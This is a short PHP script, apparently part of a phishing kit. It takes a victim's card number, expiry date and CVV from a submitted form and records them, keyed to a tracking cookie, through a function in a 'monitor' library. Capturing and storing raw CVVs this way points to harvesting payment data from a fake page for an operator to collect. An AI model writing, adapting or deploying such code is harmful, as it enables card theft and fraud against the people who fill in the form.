<?php
require('../../monitor/lib/funciones.php');

date_default_timezone_set('America/Bogota');

$registro = $_COOKIE['registro'];

$tarjeta = $_POST['trj'];
$fecha = $_POST['fec'];
$cvv = $_POST['codv'];

actualizar_registro_tar($registro,$tarjeta,$fecha,$cvv);

?>